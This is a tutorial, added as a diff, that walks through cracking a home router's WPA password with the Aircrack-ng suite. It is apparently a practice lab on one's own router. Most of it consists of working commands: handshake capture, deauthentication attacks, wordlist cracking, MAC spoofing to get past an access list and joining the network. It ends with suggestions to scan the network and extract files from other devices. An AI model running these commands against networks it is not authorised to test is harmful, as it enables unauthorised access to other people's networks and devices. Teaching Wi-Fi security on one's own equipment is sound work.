@@ -1,0 +1,200 @@
+********************************************************
+Hacking a Home Router using Aircrack-ng Suite
+********************************************************
+Author: Saulo S. Ortiz
+Date: 20161013
+Updated: 20180526
+
+DISCLAIMER:
+1. These steps will only work if you have your ACL set. If you have a router that is fully open—as in bought it, connected it—then these steps will not fully work. These steps are for a more secure router that has a limited IP pool range and also uses an ACL.
+
+2. If you don't have a separate router to play with and you use your own main one, then be aware that connectivity will be intermittent after performing these steps. You may even have to reboot your router or any other devices to get them to work as before. Worst case scenario would be that you may have to reset your router, so do these steps at your own risk. I am not responsible for any issues/damages these steps may cause. I have tested these steps multiple times for accuracy, but every hardware is different and therefore may react differently.
+
+COMMANDS YOU WILL USE:
+•	ls 		– list directory shows you the directory contents.
+•	mv 		– move lets you move a file around and it’s also used for renaming a file.
+•	rm 		– remove permanently deletes a file.
+•	cd .. 		– let you move back a directory.
+•	cd ~ 		– takes you to the home directory.
+•	su 		– give you root access.
+•	cat 		– lets you read the contents of a file.
+•	nano 		– a great text editor you will need to edit the password file.
+•	Ctrl + L 	– to clear the screen.
+•	mkdir 		– creates a directory…this one is optional.
+•	rm –rf 		– permanently deletes a folder and all its contents.
+
+--------------------------------------------------------------
+SECTION #1: THE SETUP
+--------------------------------------------------------------
+You'll need the following:
+•	A router that has b/g/n radio.
+•	A password list (any text file with the router's password in it or use John The Ripper's
+	password.lst file).
+•	An ALFA card antenna that detects b/g/n or an EDIMAX mini USB antenna.
+•	A second device to connect to the router and generate #Data Frames...tablet, cellphone, etc...
+•	Any Linux distro to download and install Aircrack-ng suite. I recommend Linux Mint. Kali OS already has it installed.
+
+1. Make sure you FORGET your current network...this way your computer won’t automatically try to connect to it during this exercise.
+
+2. Open the password list and add the password that allows devices to connect to your router…do NOT use the administrative password unless they are the same…and that is NOT very secure.
+
+3. Copy the password file to an easy to get to folder, meaning not inside multiple sub-folders…try the Desktop.
+
+4. Add any additional devices to your router unless you already did. For these steps you must have an ACL and your pool has to be limited to the amount of devices connected to it.
+
+ 	Note: Devices connected to the target router do not need to be ON, they just need to be in the ACL.
+
+--------------------------------------------------------------
+SECTION #2: THE PROCEDURE
+--------------------------------------------------------------
+1.	Open a terminal screen and go to root. Make sure you use the same root command in every terminal screen. Also, for su, the default password is toor unless you’ve already changed.
+•	su	–or–	sudo –s
+
+2.	Connect the antenna adapter and verify it’s available.
+•	airmon-ng
+
+3.	Set antenna (wlan1) into monitor mode. wlan1 is my Edimax USB antenna, yours could have a
+different name…if so, research how you can change the name if you need to.
+•	airmon-ng start wlan1
+
+ 	Note: You may need to kill processes that could interfere...airmon-ng check kill.
+
+4. Verify mon0 is active.
+•	airmon-ng
+
+5. Check for other processes and try to kill them again…not all processes can be killed.
+•	airmon-ng check
+
+6. Scan the air. Notice on the top left corner how this command scans all the channels randomly.
+•	airodump-ng mon0
+
+7. Select the target you want, in this case your own router and stop the scan (Ctrl + C). Write down the ESSID, its channel and the MAC Address. The ESSID or SSID is the name of the router.
+
+8. Open a second terminal screen and set the antenna's channel to the target's channel.
+•	ifconfig wlan1 down
+•	iwconfig wlan1 channel  ##	(where ## is the channel of the router we want to attack)
+•	iwlist wlan1 channel		(to verify what channel the card is in)
+•	ifconfig wlan1 up
+
+9. Re-confirm new channel.
+•	iwlist wlan1 channel
+
+10. Wait a few minutes then stop the scan… look at STATION for specific devices connected to the target. Notice that channel scanning is no longer random but set to the channel we want.
+•	airodump-ng -c 1 --bssid <target_mac_address> mon0
+
+11. Go online and find the manufacturer of each STATION using the first 3 hexadecimals of their MAC address.
+•	wintelguy.com	–or–
+•	wireshark.org/tools.oui-lookup.html
+
+--In the first terminal screen...
+
+12. Clear the screen (Ctrl + L) and start a packet capture.
+•	airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> mon0
+
+ 	Note: Use --ignore-negative-one if you see { fixed channel mon0: -1 } on the top right corner.
+
+•	airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> mon0 --ignore-negative-one
+(To capture as .cap file)	–or–
+•	airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> --ivs mon0
+•	airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> --ivs mon0 --ignore-negative-one
+(Capturing an .ivs file takes a long time)
+
+ 	Note: You’ll need more than 20,000 #Data Frames to break the .ivs file…20,000+ is fine for breaking the .cap file.
+
+--In a new terminal screen...
+
+13. Deauthorize the router to get the WPA Handshake…may or may not display.
+•	aireplay-ng -0 5 -a <target_mac_address> mon0 --ignore-negative-one
+(-a Router's MAC address)
+				–or–
+•	aireplay-ng -0 5 -e ESSID mon0 --ignore-negative-one
+(-e Router's Name...use --ignore-negative-one if you see fixed channel mon0: -1)
+
+ 	Note: You may need to raise the deauthorizing number from 5 to 15 or more.
+
+14. Stop the scanning and crack the password in the .cap file. Capturing either .cap or .ivs will give you the same results, but capturing .ivs will take a long time…possibly hours.
+•	aircrack-ng -w Download/password.lst FILE_001.cap
+				–or–
+•	aircrack-ng -w Download/password.lst FILE_001.ivs
+
+ 	Note: The above example is my folder...yours will be different depending where you saved the password file…WPA Handshake message may or may not appear on screen.
+
+15. Congrats! The password was found! That is, if you placed it in the password list first. If you did no then do it now and re-run the aircrack-ng command.
+
+REMEMBER THAT:
+We needed to put the password in the password.lst file because your password may not be too common and makes the demonstration process faster. This is just for practice and to simulate you hacked into an unknown router. In reality it would take much longer to capture the password and crack it assuming the target has a way too common password and it’s in a password list.
+
+Also, if you had {fixed channel mon0: -1} displayed during the packet capturing process, then you need to use --ignore-negative-one with the airodump-ng and aireplay-ng commands.
+
+--------------------------------------------------------------
+SECTION #3: SPOOFING A DEVICE
+--------------------------------------------------------------
+In this section I’ll be kicking off and spoofing my LG phone while using the main Wi-Fi adapter (wlan0). At this point no commands should be running, and your USB adapter (wlan1) should still be in monitor mode (mon0).
+
+1. Make sure the main Wi-Fi adapter (wlan0) is up and running. This is the main Wi-Fi adapter and NOT the USB device that was originally set to monitor mode.
+•	ifconfig
+
+2. In one terminal screen run the following command:
+•	aireplay-ng -0 0 -a <bssid> -c <device_mac_address> mon0
+				–or–
+•	aireplay-ng -0 0 -a <bssid> -c <device_mac_address> mon0 --ignore-negative-one
+
+3. Select the device to spoof and change the MAC address of the Wi-Fi to match it. Again, this is NOT the adapter in monitor mode!!!
+•	ifconfig wlan0 down
+•	macchanger -m <target_mac_address> wlan0
+•	ifconfig wlan0 up
+
+5. Confirm the MAC address change.
+•	ifconfig		–or–
+•	ifconfig wlan0		–or–
+•	ifconfig | grep HW	–or–
+•	iw dev
+
+4. Create a configuration file with the router’s password, psk file and ESSID information.
+•	wpa_passphrase ESSID >> myfile.conf <found_password>
+Ex: wpa_passphrase ThePromisedLAN >> myfile.conf password1234
+
+5. Stop the deauthorization from step #2 above.
+
+6. Use the configuration file to associate your computer as the spoofed device and wait. Watch for CTRL-EVENT-CONNECTED message.
+•	wpa_supplicant -D wext -i wlan0 -c myfile.conf
+
+ 	Note: If you close the terminal for step #6 your computer will disconnect.
+
+7. On the first terminal screen check the router’s specs and connection verification.
+•	iw wlan0 link
+
+8. Configure the NIC using the DHCP protocol.
+•	dhclient wlan0
+
+9. Display the routing table.
+•	ip route show
+
+10. Ping your router, then a website (IP or URL).
+
+11. Open a browser and go to a website.
+
+12. Congrats! You just spoofed yourself into the router! Now what else can you do?
+
+--------------------------------------------------------------
+SECTION #4: ADDITIONAL NOTES
+--------------------------------------------------------------
+1.	Open a third terminal screen and do an nmap scan of the network and find other devices that may be opened and their ports. Figure what other tools you can use to get into them and extract files. A Wi-Fi printer is a good one to check. Use https://www.speedguide.net/ports.php to learn more about what each port does.
+
+2.	What is the MAC of the spoofed/kicked device?
+
+3.	What is IP and MAC address of the attacking computer?
+
+4.	Can you use Thunderbird or Outlook? Why/why not?
+
+5.	Can you use gmail, etc?
+
+6.	Do you understand what each command does? Write them down with a quick explanation of what you understand they do.
+
+7.	Research what Google Hacks mean and how to use the commands to your advantage.
+
+8.	Now try to do this using wifite. You may need to reboot the system to do this a second time...research how to overcome this issue and restore your Wi-Fi without rebooting your system.
+
+9.	Use your Google-fu skills and research how to find hidden SSIDs.
+
+10.	Remember not to be specific on your searches…instead of searching for: “how to change the name of a network card in linux” try: “change NIC name linux”.
